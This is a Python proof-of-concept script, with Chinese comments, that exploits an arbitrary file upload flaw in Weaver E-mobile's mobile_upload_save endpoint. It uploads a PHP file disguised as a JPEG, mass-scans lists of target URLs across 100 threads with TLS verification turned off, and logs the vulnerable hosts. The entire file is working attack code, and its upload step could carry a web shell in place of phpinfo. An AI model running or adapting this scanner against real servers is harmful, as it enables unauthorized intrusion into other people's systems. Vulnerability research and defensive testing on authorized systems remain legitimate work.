import requests
import re
import argparse
import sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """
        .__             /\             
  _____ |__| ____    ___)/___.__.__ __ 
 /     \|  |/    \  / ___<   |  |  |  \
|  Y Y  \  |   |  \/ /_/  >___  |  |  /
|__|_|  /__|___|  /\___  // ____|____/ 
      \/        \//_____/ \/          
                                   version:1.1.1                           
"""
    print(test)

def main():
    banner()
    #处理命令行输入的参数
    parser = argparse.ArgumentParser(description="泛微存在任意文件上传漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='Please input link')
    parser.add_argument('-f','--file',dest='file',type=str,help='Please input file')
    #处理参数
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as f:
            for line in f.readlines():
                url_list.append(line.strip().replace('\n',''))
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usage:\n\t python {sys.argv[0]} -h")
def poc(target):
    payload = '/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save'
    url = target + payload
    headers = {
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'Origin': 'null',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundarydRVCGWq4Cx3Sq6tt',
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
        'Connection': 'close'
}
    files = {
        'upload_quwan': ('2.php', '<?php phpinfo();?>', 'image/jpeg'),
        'file': (None, '', 'application/octet-stream')
    }
    proxies = {
        'http': 'http://127.0.0.1:8080',
        'https': 'http://127.0.0.1:8080'
    }
    res = requests.get(url=target)
    if res.status_code == 200:
        try:
            response = requests.post(url=url,headers=headers,files=files,verify=False,proxies=proxies)
            if response.status_code == 200:
                print(f"[*该网址存在任意文件上传漏洞{target}]")
                with open('result.txt', 'a', encoding='utf-8') as f:
                    f.write(target + '\n')
            else:
                print(f"[+该网址不存在任意文件上传漏洞{target}]")
        except Exception as e:
            print(f"[-该网址存在问题，请手动检测{target}]")

if __name__ =='__main__':
    main()